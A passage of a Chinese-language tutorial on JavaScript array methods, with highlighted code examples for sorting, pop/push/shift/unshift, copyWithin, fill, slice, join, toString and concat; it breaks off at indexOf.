class="hljs-string">//</span> [<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">25</span>]<span class="hljs-string">;</span> <span class="hljs-string">//</span> <span class="hljs-string">降序</span> <span class="hljs-string">被减数和减数调换了</span>  <span class="hljs-number">20</span><span class="hljs-number">-10</span><span class="hljs-string">&gt;0</span> <span class="hljs-string">被减数b(20)在减数a(10)的前面</span> <span class="hljs-string">array.sort(function(a,b)&#123;</span>   <span class="hljs-string">return</span> <span class="hljs-string">b-a;</span> <span class="hljs-string">&#125;);</span> <span class="hljs-string">console.log(array);</span> <span class="hljs-string">//</span> [<span class="hljs-number">25</span>,<span class="hljs-number">20</span>,<span class="hljs-number">10</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>]<span class="hljs-string">;</span><span class="hljs-string">复制代码</span></code></pre></div></li><li><p>数组多条件排序</p><div class="hljs code-wrapper"><pre><code class="hljs xquery"> var <span class="hljs-keyword">array</span> = [<span class="hljs-built_in">&#123;id</span>:<span class="hljs-number">10</span>,age:<span class="hljs-number">2</span>&#125;,<span class="hljs-built_in">&#123;id</span>:<span class="hljs-number">5</span>,age:<span class="hljs-number">4</span>&#125;,<span class="hljs-built_in">&#123;id</span>:<span class="hljs-number">6</span>,age:<span class="hljs-number">10</span>&#125;,<span class="hljs-built_in">&#123;id</span>:<span class="hljs-number">9</span>,age:<span class="hljs-number">6</span>&#125;,<span class="hljs-built_in">&#123;id</span>:<span class="hljs-number">2</span>,age:<span class="hljs-number">8</span>&#125;,<span class="hljs-built_in">&#123;id</span>:<span class="hljs-number">10</span>,age:<span class="hljs-number">9</span>&#125;];     <span class="hljs-keyword">array</span><span class="hljs-built_in">.sort</span>(<span class="hljs-keyword">function</span>(a,b)&#123;         <span class="hljs-keyword">if</span>(a<span class="hljs-built_in">.id</span> === b<span class="hljs-built_in">.id</span>)&#123;// 如<span class="hljs-built_in">果id</span>的值相等，按照age的值降序             <span class="hljs-keyword">return</span> b.age - a.age         &#125;<span class="hljs-keyword">else</span>&#123; // 如<span class="hljs-built_in">果id</span>的值不相等，按<span class="hljs-built_in">照id</span>的值升序             <span class="hljs-keyword">return</span> a<span class="hljs-built_in">.id</span> - b<span class="hljs-built_in">.id</span>         &#125;     &#125;)  // [&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">8</span>&#125;,&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">5</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">4</span>&#125;,&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">6</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">10</span>&#125;,&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">9</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">6</span>&#125;,&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">10</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">9</span>&#125;,&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">10</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">2</span>&#125;] 复制代码</code></pre></div></li><li><p>自定义比较函数，天空才是你的极限</p></li></ol><p>类似的：<strong>运用好返回值，我们可以写出任意符合自己需求的比较函数</strong></p><div class="hljs code-wrapper"><pre><code class="hljs xquery">    var <span class="hljs-keyword">array</span> = [<span class="hljs-built_in">&#123;name</span>:<span class="hljs-string">&#x27;Koro1&#x27;</span>&#125;,<span class="hljs-built_in">&#123;name</span>:<span class="hljs-string">&#x27;Koro1&#x27;</span>&#125;,<span class="hljs-built_in">&#123;name</span>:<span class="hljs-string">&#x27;OB&#x27;</span>&#125;,<span class="hljs-built_in">&#123;name</span>:<span class="hljs-string">&#x27;Koro1&#x27;</span>&#125;,<span class="hljs-built_in">&#123;name</span>:<span class="hljs-string">&#x27;OB&#x27;</span>&#125;,<span class="hljs-built_in">&#123;name</span>:<span class="hljs-string">&#x27;OB&#x27;</span>&#125;];    <span class="hljs-keyword">array</span><span class="hljs-built_in">.sort</span>(<span class="hljs-keyword">function</span>(a,b)&#123;        <span class="hljs-keyword">if</span>(a<span class="hljs-built_in">.name</span> === <span class="hljs-string">&#x27;Koro1&#x27;</span>)&#123;// 如<span class="hljs-built_in">果name</span>是<span class="hljs-string">&#x27;Koro1&#x27;</span> 返回-<span class="hljs-number">1</span> ，-<span class="hljs-number">1</span>&lt;<span class="hljs-number">0</span> a排在b的前面            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>        &#125;<span class="hljs-keyword">else</span>&#123; // 如果不是的话，a排在b的后面          <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>        &#125;    &#125;)    // [&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;Koro1&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;Koro1&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;Koro1&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;OB&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;OB&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;OB&quot;</span>&#125;] 复制代码</code></pre></div><h4 id="pop-删除一个数组中的最后的一个元素"><a href="#pop-删除一个数组中的最后的一个元素" class="headerlink" title="pop() 删除一个数组中的最后的一个元素"></a>pop() 删除一个数组中的最后的一个元素</h4><p>定义: pop() 方法删除一个数组中的最后的一个元素，并且返回这个元素。</p><p>参数: 无。</p><div class="hljs code-wrapper"><pre><code class="hljs yaml">    <span class="hljs-string">let</span>  <span class="hljs-string">a</span> <span class="hljs-string">=</span>  [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]<span class="hljs-string">;</span>    <span class="hljs-string">let</span> <span class="hljs-string">item</span> <span class="hljs-string">=</span> <span class="hljs-string">a.pop();</span>  <span class="hljs-string">//</span> <span class="hljs-number">3</span>    <span class="hljs-string">console.log(a);</span> <span class="hljs-string">//</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]<span class="hljs-string">复制代码</span></code></pre></div><h4 id="shift-删除数组的第一个元素"><a href="#shift-删除数组的第一个元素" class="headerlink" title="shift() 删除数组的第一个元素"></a>shift() 删除数组的第一个元素</h4><p>定义: shift()方法删除数组的第一个元素，并返回这个元素。</p><p>参数: 无。</p><div class="hljs code-wrapper"><pre><code class="hljs yaml">    <span class="hljs-string">let</span>  <span class="hljs-string">a</span> <span class="hljs-string">=</span>  [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]<span class="hljs-string">;</span>    <span class="hljs-string">let</span> <span class="hljs-string">item</span> <span class="hljs-string">=</span> <span class="hljs-string">a.shift();</span>  <span class="hljs-string">//</span> <span class="hljs-number">1</span>    <span class="hljs-string">console.log(a);</span> <span class="hljs-string">//</span> [<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]<span class="hljs-string">复制代码</span></code></pre></div><h4 id="push-向数组的末尾添加元素"><a href="#push-向数组的末尾添加元素" class="headerlink" title="push() 向数组的末尾添加元素"></a>push() 向数组的末尾添加元素</h4><p>定义：push() 方法可向数组的末尾添加一个或多个元素，并返回新的长度。</p><p>参数:  item1, item2, …, itemX ,要添加到数组末尾的元素</p><div class="hljs code-wrapper"><pre><code class="hljs yaml">    <span class="hljs-string">let</span>  <span class="hljs-string">a</span> <span class="hljs-string">=</span>  [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]<span class="hljs-string">;</span>    <span class="hljs-string">let</span> <span class="hljs-string">item</span> <span class="hljs-string">=</span> <span class="hljs-string">a.push(&#x27;末尾&#x27;);</span>  <span class="hljs-string">//</span> <span class="hljs-number">4</span>    <span class="hljs-string">console.log(a);</span> <span class="hljs-string">//</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;末尾&#x27;</span>]<span class="hljs-string">复制代码</span></code></pre></div><h4 id="unshift"><a href="#unshift" class="headerlink" title="unshift()"></a>unshift()</h4><p>定义：unshift() 方法可向数组的开头添加一个或更多元素，并返回新的长度。</p><p>参数:  item1, item2, …, itemX ,要添加到数组开头的元素</p><div class="hljs code-wrapper"><pre><code class="hljs yaml">    <span class="hljs-string">let</span>  <span class="hljs-string">a</span> <span class="hljs-string">=</span>  [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]<span class="hljs-string">;</span>    <span class="hljs-string">let</span> <span class="hljs-string">item</span> <span class="hljs-string">=</span> <span class="hljs-string">a.unshift(&#x27;开头&#x27;);</span>  <span class="hljs-string">//</span> <span class="hljs-number">4</span>    <span class="hljs-string">console.log(a);</span> <span class="hljs-string">//</span> [<span class="hljs-string">&#x27;开头&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]<span class="hljs-string">复制代码</span></code></pre></div><h4 id="reverse-颠倒数组中元素的顺序"><a href="#reverse-颠倒数组中元素的顺序" class="headerlink" title="reverse() 颠倒数组中元素的顺序"></a>reverse() 颠倒数组中元素的顺序</h4><p>定义: reverse() 方法用于颠倒数组中元素的顺序。</p><p>参数: 无</p><div class="hljs code-wrapper"><pre><code class="hljs yaml">    <span class="hljs-string">let</span>  <span class="hljs-string">a</span> <span class="hljs-string">=</span>  [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]<span class="hljs-string">;</span>    <span class="hljs-string">a.reverse();</span>      <span class="hljs-string">console.log(a);</span> <span class="hljs-string">//</span> [<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>]<span class="hljs-string">复制代码</span></code></pre></div><h4 id="ES6-copyWithin-指定位置的成员复制到其他位置"><a href="#ES6-copyWithin-指定位置的成员复制到其他位置" class="headerlink" title="ES6: copyWithin() 指定位置的成员复制到其他位置"></a>ES6: copyWithin() 指定位置的成员复制到其他位置</h4><p>定义: 在当前数组内部，将指定位置的成员复制到其他位置,并返回这个数组。</p><p>语法:</p><div class="hljs code-wrapper"><pre><code class="hljs reasonml">    <span class="hljs-built_in">array</span>.copy<span class="hljs-constructor">Within(<span class="hljs-params">target</span>, <span class="hljs-params">start</span> = 0, <span class="hljs-params">end</span> = <span class="hljs-params">this</span>.<span class="hljs-params">length</span>)</span>复制代码</code></pre></div><p>参数:</p><p>三个参数都是数值，如果不是，会自动转为数值.</p><ol><li>target（必需）：从该位置开始替换数据。如果为负值，表示倒数。</li><li>start（可选）：从该位置开始读取数据，默认为 0。如果为负值，表示倒数。</li><li>end（可选）：到该位置前停止读取数据，默认等于数组长度。使用负数可从数组结尾处规定位置。</li></ol><p>浏览器兼容(MDN): chrome 45,Edge 12,Firefox32,Opera 32,Safari 9, IE 不支持</p><p>eg:</p><div class="hljs code-wrapper"><pre><code class="hljs awk">        <span class="hljs-regexp">//</span> -<span class="hljs-number">2</span>相当于<span class="hljs-number">3</span>号位，-<span class="hljs-number">1</span>相当于<span class="hljs-number">4</span>号位        [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>].copyWithin(<span class="hljs-number">0</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">1</span>)        <span class="hljs-regexp">//</span> [<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]        var a=[<span class="hljs-string">&#x27;OB1&#x27;</span>,<span class="hljs-string">&#x27;Koro1&#x27;</span>,<span class="hljs-string">&#x27;OB2&#x27;</span>,<span class="hljs-string">&#x27;Koro2&#x27;</span>,<span class="hljs-string">&#x27;OB3&#x27;</span>,<span class="hljs-string">&#x27;Koro3&#x27;</span>,<span class="hljs-string">&#x27;OB4&#x27;</span>,<span class="hljs-string">&#x27;Koro4&#x27;</span>,<span class="hljs-string">&#x27;OB5&#x27;</span>,<span class="hljs-string">&#x27;Koro5&#x27;</span>]        <span class="hljs-regexp">//</span> <span class="hljs-number">2</span>位置开始被替换,<span class="hljs-number">3</span>位置开始读取要替换的 <span class="hljs-number">5</span>位置前面停止替换        a.copyWithin(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>)        <span class="hljs-regexp">//</span> [<span class="hljs-string">&quot;OB1&quot;</span>,<span class="hljs-string">&quot;Koro1&quot;</span>,<span class="hljs-string">&quot;Koro2&quot;</span>,<span class="hljs-string">&quot;OB3&quot;</span>,<span class="hljs-string">&quot;OB3&quot;</span>,<span class="hljs-string">&quot;Koro3&quot;</span>,<span class="hljs-string">&quot;OB4&quot;</span>,<span class="hljs-string">&quot;Koro4&quot;</span>,<span class="hljs-string">&quot;OB5&quot;</span>,<span class="hljs-string">&quot;Koro5&quot;</span>] 复制代码</code></pre></div><p>从上述栗子:</p><ol><li>第一个参数是开始被替换的元素位置</li><li>要替换数据的位置范围:从第二个参数是开始读取的元素，在第三个参数前面一个元素停止读取</li><li>数组的长度不会改变</li><li><strong>读了几个元素就从开始被替换的地方替换几个元素</strong></li></ol><h4 id="ES6-fill-填充数组"><a href="#ES6-fill-填充数组" class="headerlink" title="ES6: fill() 填充数组"></a>ES6: fill() 填充数组</h4><p>定义:  使用给定值，填充一个数组。</p><p>参数:</p><p>第一个元素(必须): 要填充数组的值</p><p>第二个元素(可选): 填充的开始位置,默认值为0</p><p>第三个元素(可选)：填充的结束位置，默认是为<code>this.length</code></p><p><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/fill%23%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%BC%E5%AE%B9%E6%80%A7">MDN浏览器兼容</a></p><div class="hljs code-wrapper"><pre><code class="hljs awk">    [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>].fill(<span class="hljs-number">7</span>)    <span class="hljs-regexp">//</span> [<span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>]    [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>].fill(<span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)    <span class="hljs-regexp">//</span> [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;c&#x27;</span>]复制代码</code></pre></div><hr><h3 id="不改变原数组的方法-8个"><a href="#不改变原数组的方法-8个" class="headerlink" title="不改变原数组的方法(8个):"></a>不改变原数组的方法(8个):</h3><div class="hljs code-wrapper"><pre><code class="hljs gradle">    ES5：    slice、<span class="hljs-keyword">join</span>、toLocateString、toStrigin、cancat、indexOf、lastIndexOf、    ES7：    <span class="hljs-keyword">includes</span>复制代码</code></pre></div><h4 id="slice-浅拷贝数组的元素"><a href="#slice-浅拷贝数组的元素" class="headerlink" title="slice() 浅拷贝数组的元素"></a>slice() 浅拷贝数组的元素</h4><p>定义： 方法返回一个从开始到结束（不包括结束）选择的数组的一部分浅拷贝到一个新数组对象，且原数组不会被修改。</p><p><strong>注意</strong>：字符串也有一个slice() 方法是用来提取字符串的，不要弄混了。</p><p>语法:</p><div class="hljs code-wrapper"><pre><code class="hljs pgsql">    <span class="hljs-keyword">array</span>.<span class="hljs-keyword">slice</span>(<span class="hljs-keyword">begin</span>, <span class="hljs-keyword">end</span>);复制代码</code></pre></div><p>参数:</p><p>begin(可选): 索引数值,接受负值，从该索引处开始提取原数组中的元素,默认值为0。</p><p>end(可选):索引数值(不包括),接受负值，在该索引处前结束提取原数组元素，默认值为数组末尾(包括最后一个元素)。</p><div class="hljs code-wrapper"><pre><code class="hljs prolog">    let a= [<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-string">&#x27;world&#x27;</span>];    let b=a.slice(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>); // [<span class="hljs-string">&#x27;hello&#x27;</span>]    a[<span class="hljs-number">0</span>]=<span class="hljs-string">&#x27;改变原数组&#x27;</span>;    console.log(a,b); // [<span class="hljs-string">&#x27;改变原数组&#x27;</span>,<span class="hljs-string">&#x27;world&#x27;</span>] [<span class="hljs-string">&#x27;hello&#x27;</span>]    b[<span class="hljs-number">0</span>]=<span class="hljs-string">&#x27;改变拷贝的数组&#x27;</span>;     console.log(a,b); // [<span class="hljs-string">&#x27;改变原数组&#x27;</span>,<span class="hljs-string">&#x27;world&#x27;</span>] [<span class="hljs-string">&#x27;改变拷贝的数组&#x27;</span>]复制代码</code></pre></div><p>如上：新数组是浅拷贝的，<strong>元素是简单数据类型，改变之后不会互相干扰</strong>。</p><p>如果是<strong>复杂数据类型(对象,数组)的话，改变其中一个，另外一个也会改变</strong>。</p><div class="hljs code-wrapper"><pre><code class="hljs awk">    let a= [&#123;name:<span class="hljs-string">&#x27;OBKoro1&#x27;</span>&#125;];    let b=a.slice();    console.log(b,a); <span class="hljs-regexp">//</span> [&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;OBKoro1&quot;</span>&#125;]  [&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;OBKoro1&quot;</span>&#125;]    <span class="hljs-regexp">//</span> a[<span class="hljs-number">0</span>].name=<span class="hljs-string">&#x27;改变原数组&#x27;</span>;    <span class="hljs-regexp">//</span> console.log(b,a); <span class="hljs-regexp">//</span> [&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;改变原数组&quot;</span>&#125;] [&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;改变原数组&quot;</span>&#125;]    <span class="hljs-regexp">//</span> b[<span class="hljs-number">0</span>].name=<span class="hljs-string">&#x27;改变拷贝数组&#x27;</span>,b[<span class="hljs-number">0</span>].koro=<span class="hljs-string">&#x27;改变拷贝数组&#x27;</span>;    <span class="hljs-regexp">//</span>  [&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;改变拷贝数组&quot;</span>,<span class="hljs-string">&quot;koro&quot;</span>:<span class="hljs-string">&quot;改变拷贝数组&quot;</span>&#125;] [&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;改变拷贝数组&quot;</span>,<span class="hljs-string">&quot;koro&quot;</span>:<span class="hljs-string">&quot;改变拷贝数组&quot;</span>&#125;]复制代码</code></pre></div><p>原因在定义上面说过了的：slice()是浅拷贝，对于复杂的数据类型浅拷贝，拷贝的只是指向原数组的指针，所以无论改变原数组，还是浅拷贝的数组，都是改变原数组的数据。</p><h4 id="join-数组转字符串"><a href="#join-数组转字符串" class="headerlink" title="join()  数组转字符串"></a>join()  数组转字符串</h4><p>定义:  join() 方法用于把数组中的所有元素通过指定的分隔符进行分隔放入一个字符串，返回生成的字符串。</p><p>语法:</p><div class="hljs code-wrapper"><pre><code class="hljs axapta">    array.<span class="hljs-keyword">join</span>(<span class="hljs-built_in">str</span>)复制代码</code></pre></div><p>参数:</p><p>str(可选): 指定要使用的分隔符，默认使用逗号作为分隔符。</p><div class="hljs code-wrapper"><pre><code class="hljs csharp">    <span class="hljs-keyword">let</span> a= [<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-string">&#x27;world&#x27;</span>];    <span class="hljs-keyword">let</span> str=a.<span class="hljs-keyword">join</span>(); <span class="hljs-comment">// &#x27;hello,world&#x27;</span>    <span class="hljs-keyword">let</span> str2=a.<span class="hljs-keyword">join</span>(<span class="hljs-string">&#x27;+&#x27;</span>); <span class="hljs-comment">// &#x27;hello+world&#x27;</span>复制代码</code></pre></div><p>使用join方法或者下文说到的toString方法时，当数组中的元素也是数组或者是对象时会出现什么情况？</p><div class="hljs code-wrapper"><pre><code class="hljs csharp">    <span class="hljs-keyword">let</span> a= [[<span class="hljs-string">&#x27;OBKoro1&#x27;</span>,<span class="hljs-string">&#x27;23&#x27;</span>],<span class="hljs-string">&#x27;test&#x27;</span>];    <span class="hljs-keyword">let</span> str1=a.<span class="hljs-keyword">join</span>(); <span class="hljs-comment">// OBKoro1,23,test</span>    <span class="hljs-keyword">let</span> b= [&#123;name:<span class="hljs-string">&#x27;OBKoro1&#x27;</span>,age:<span class="hljs-string">&#x27;23&#x27;</span>&#125;,<span class="hljs-string">&#x27;test&#x27;</span>];    <span class="hljs-keyword">let</span> str2 = b.<span class="hljs-keyword">join</span>(); <span class="hljs-comment">// [object Object],test</span>    <span class="hljs-comment">// 对象转字符串推荐JSON.stringify(obj);</span>复制代码</code></pre></div><p>所以，<code>join()/toString()</code>方法在数组元素是数组的时候，会将里面的数组也调用<code>join()/toString()</code>,如果是对象的话，对象会被转为<code>[object Object]</code>字符串。</p><h4 id="toLocaleString-数组转字符串"><a href="#toLocaleString-数组转字符串" class="headerlink" title="toLocaleString() 数组转字符串"></a>toLocaleString() 数组转字符串</h4><p>定义: 返回一个表示数组元素的字符串。该字符串由数组中的每个元素的 toLocaleString() 返回值经调用 join() 方法连接（由逗号隔开）组成。</p><p>语法:</p><div class="hljs code-wrapper"><pre><code class="hljs reasonml">    <span class="hljs-built_in">array</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">LocaleString()</span>复制代码</code></pre></div><p>参数：无。</p><div class="hljs code-wrapper"><pre><code class="hljs javascript">    <span class="hljs-keyword">let</span> a=[&#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;OBKoro1&#x27;</span>&#125;,<span class="hljs-number">23</span>,<span class="hljs-string">&#x27;abcd&#x27;</span>,<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>()];    <span class="hljs-keyword">let</span> str=a.toLocaleString(); <span class="hljs-comment">// [object Object],23,abcd,2018/5/28 下午1:52:20 </span>复制代码</code></pre></div><p>如上述栗子：调用数组的<code>toLocaleString</code>方法，数组中的每个元素都会调用自身的<code>toLocaleString</code>方法，对象调用对象的<code>toLocaleString</code>,Date调用Date的<code>toLocaleString</code>。</p><h4 id="toString-数组转字符串-不推荐"><a href="#toString-数组转字符串-不推荐" class="headerlink" title="toString() 数组转字符串 不推荐"></a>toString() 数组转字符串 不推荐</h4><p>定义: toString() 方法可把数组转换为由逗号链接起来的字符串。</p><p>语法:</p><div class="hljs code-wrapper"><pre><code class="hljs reasonml">    <span class="hljs-built_in">array</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>复制代码</code></pre></div><p>参数: 无。</p><p>该方法的效果和join方法一样，都是用于数组转字符串的，但是与join方法相比没有优势，也不能自定义字符串的分隔符，因此不推荐使用。</p><p><strong>值得注意的是</strong>：当数组和字符串操作的时候，js 会调用这个方法将数组自动转换成字符串</p><div class="hljs code-wrapper"><pre><code class="hljs awk">   let b= [ <span class="hljs-string">&#x27;toString&#x27;</span>,<span class="hljs-string">&#x27;演示&#x27;</span>].toString(); <span class="hljs-regexp">//</span> toString,演示   let a= [<span class="hljs-string">&#x27;调用toString&#x27;</span>,<span class="hljs-string">&#x27;连接在我后面&#x27;</span>]+<span class="hljs-string">&#x27;啦啦啦&#x27;</span>; <span class="hljs-regexp">//</span> 调用toString,连接在我后面啦啦啦复制代码</code></pre></div><h4 id="cancat"><a href="#cancat" class="headerlink" title="cancat"></a>cancat</h4><p>定义： 方法用于合并两个或多个数组，返回一个新数组。</p><p>语法：</p><div class="hljs code-wrapper"><pre><code class="hljs angelscript">    var newArr =oldArray.concat(<span class="hljs-built_in">array</span>X,<span class="hljs-built_in">array</span>X,......,<span class="hljs-built_in">array</span>X)复制代码</code></pre></div><p>参数：</p><p>arrayX（必须）：该参数可以是具体的值，也可以是数组对象。可以是任意多个。</p><p>eg1:</p><div class="hljs code-wrapper"><pre><code class="hljs yaml">    <span class="hljs-string">let</span> <span class="hljs-string">a</span> <span class="hljs-string">=</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<span class="hljs-string">;</span>    <span class="hljs-string">let</span> <span class="hljs-string">b</span> <span class="hljs-string">=</span> [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]<span class="hljs-string">;</span>    <span class="hljs-string">//连接两个数组</span>    <span class="hljs-string">let</span> <span class="hljs-string">newVal=a.concat(b);</span> <span class="hljs-string">//</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]    <span class="hljs-string">//</span> <span class="hljs-string">连接三个数组</span>    <span class="hljs-string">let</span> <span class="hljs-string">c</span> <span class="hljs-string">=</span> [<span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]    <span class="hljs-string">let</span> <span class="hljs-string">newVal2</span> <span class="hljs-string">=</span> <span class="hljs-string">a.concat(b,</span> <span class="hljs-string">c);</span> <span class="hljs-string">//</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>]    <span class="hljs-string">//</span> <span class="hljs-string">添加元素</span>    <span class="hljs-string">let</span> <span class="hljs-string">newVal3</span> <span class="hljs-string">=</span> <span class="hljs-string">a.concat(&#x27;添加元素&#x27;,b,</span> <span class="hljs-string">c,&#x27;再加一个&#x27;);</span>     <span class="hljs-string">//</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;添加元素&quot;</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-string">&quot;再加一个&quot;</span>]   <span class="hljs-string">//</span> <span class="hljs-string">合并嵌套数组</span>  <span class="hljs-string">会浅拷贝嵌套数组</span>   <span class="hljs-string">let</span> <span class="hljs-string">d</span> <span class="hljs-string">=</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span> ]<span class="hljs-string">;</span>   <span class="hljs-string">let</span> <span class="hljs-string">f</span> <span class="hljs-string">=</span> [<span class="hljs-number">3</span>,[<span class="hljs-number">4</span>]]<span class="hljs-string">;</span>   <span class="hljs-string">let</span> <span class="hljs-string">newVal4</span> <span class="hljs-string">=</span> <span class="hljs-string">d.concat(f);</span> <span class="hljs-string">//</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,[<span class="hljs-number">4</span>]]<span class="hljs-string">复制代码</span></code></pre></div><p><strong>ES6扩展运算符<code>...</code>合并数组</strong>：</p><p>因为ES6的语法更简洁易懂，所以现在合并数组我大部分采用<code>...</code>来处理，<code>...</code>运算符可以实现<code>cancat</code>的每个栗子，且更简洁和具有高度自定义数组元素位置的效果。</p><div class="hljs code-wrapper"><pre><code class="hljs yaml">    <span class="hljs-string">let</span> <span class="hljs-string">a</span> <span class="hljs-string">=</span> [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]    <span class="hljs-string">let</span> <span class="hljs-string">b</span> <span class="hljs-string">=</span> [ <span class="hljs-number">4</span>,<span class="hljs-string">...a</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>]    <span class="hljs-string">console.log(a,b);</span> <span class="hljs-string">//</span>  [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>] [<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>]<span class="hljs-string">复制代码</span></code></pre></div><p>更多关于扩展符的详细内容移步阮一峰大神的<a href="https://link.juejin.cn/?target=http://es6.ruanyifeng.com/%23docs/array%23%E6%89%A9%E5%B1%95%E8%BF%90%E7%AE%97%E7%AC%A6">ECMAScript 6 入门</a></p><h4 id="indexOf-查找数组是否存在某个元素，返回下标"><a href="#indexOf-查找数组是否存在某个元素，返回下标" class="headerlink" title="indexOf() 查找数组是否存在某个元素，返回下标"></a>indexOf() 查找数组是否存在某个元素，返回下标</h4><p>定义: 返回在数组中可以找到一个给定元素的第一个索引，如果不存在，则返回-1。</p><p>语法:</p><div class="hljs code-wrapper"><pre><code class="hljs reasonml">    <span class="hljs-built_in">array</span>.index<span class="hljs-constructor">Of(<span class="hljs-params">searchElement</span>,<span 